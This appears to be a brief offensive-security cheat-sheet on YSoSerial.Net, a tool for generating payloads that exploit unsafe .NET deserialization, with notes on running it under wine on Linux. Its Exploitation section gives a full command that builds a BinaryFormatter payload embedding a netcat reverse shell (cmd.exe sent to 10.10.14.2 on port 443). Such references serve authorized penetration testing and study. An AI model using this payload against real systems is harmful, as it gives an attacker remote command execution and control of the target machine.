# YSoSerial.Net

<details>

<summary>What is it?</summary>

Generates payloads that exploit unsafe .NET object deserialization

[https://github.com/pwntester/ysoserial.net](https://github.com/pwntester/ysoserial.net)

</details>

<details>

<summary>Exploitation</summary>

```bash
.\ysoserial.exe -f BinaryFormatter -g WindowsIdentity -o base64 -c "c:\temp\nc64.exe -e cmd.exe 10.10.14.2 443"
```

</details>

<details>

<summary>Running ysoserial.exe on Linux</summary>

<pre class="language-bash"><code class="lang-bash"><strong>## Install wine &#x26;&#x26; winetricks &#x26;&#x26; mono
</strong><strong>sudo apt install mono-complete wine winetricks -y
</strong>	
## Download latest release of ysoserial.net and unzip it.
https://github.com/pwntester/ysoserial.net/releases
unzip ysoserial.zip
<strong>
</strong><strong>## Install dotnet48 using wine
</strong>winetricks dotnet48
	
## Run ysoserial.exe in wine
wine ysoserial.exe -f BinaryFormatter -g TypeConfuseDelegate -o base64 -c "ping 127.0.0.1"

</code></pre>

</details>

